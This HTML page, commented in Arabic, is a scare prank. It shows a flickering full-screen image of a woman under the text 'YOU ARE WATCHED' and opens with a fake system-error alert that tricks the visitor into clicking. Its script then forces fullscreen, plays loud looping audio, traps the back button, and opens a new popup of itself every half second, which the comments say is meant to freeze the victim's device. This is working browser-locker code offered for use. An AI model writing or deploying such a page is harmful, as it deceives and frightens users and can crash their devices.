<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>☠️ SYSTEM_ERROR ☠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
        
        /* صورة المرأة: تغطي الشاشة كاملة وتتحرك ديركت سواسوة */
        #stalkerEntity { 
            position: fixed; top: 0; left: 0; width: 105vw; height: 105vh; 
            object-fit: cover; z-index: 1; 
            filter: contrast(200%) brightness(40%) grayscale(100%);
            animation: aggressiveStalker 0.5s infinite alternate; /* حركة سريعة ومخيفة */
        }

        @keyframes aggressiveStalker {
            from { transform: scale(1) translate(-2%, -2%); }
            to { transform: scale(1.05) translate(-3%, -3%); }
        }

        #overlay { 
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
            z-index: 10; color: #f00; text-align: center; font-family: 'Courier New', monospace; 
            text-shadow: 0 0 20px #f00; font-weight: bold; pointer-events: none;
        }

        .blink { animation: blinker 0.1s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body onclick="engageChaos()">

    <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <div id="overlay">
        <h1 class="blink">YOU ARE WATCHED</h1>
        <p>STALKER_SYSTEM: ACTIVE سواسوة</p>
    </div>

    <audio id="horrorAudio" loop>
        <source src="tfy-krk.mp3" type="audio/mpeg">
    </audio>

    <script>
        function engageChaos() {
            // تشغيل الصوت ديركت بأعلى درجة سواسوة
            const audio = document.getElementById('horrorAudio');
            audio.volume = 1.0;
            audio.play();

            // الدخول في وضع الشاشة الكاملة سواسوة
            document.documentElement.requestFullscreen();

            // منع الخروج والـ Shock Mode (100 صفحة) سواسوة
            setInterval(() => {
                history.pushState(null, null, window.location.href);
                window.open(window.location.href, '_blank', 'width=10,height=10');
            }, 500); // سرعة مضاعفة لتبليك الجهاز سواسوة
        }

        // إجبار الضحية على الضغط لتفعيل الصوت سواسوة
        window.onload = () => {
            alert("⚠️ SYSTEM CRITICAL ERROR: PRESS OK TO REPAIR سواسوة");
        };
        window.onpopstate = () => history.go(1);
    </script>
</body>
</html>
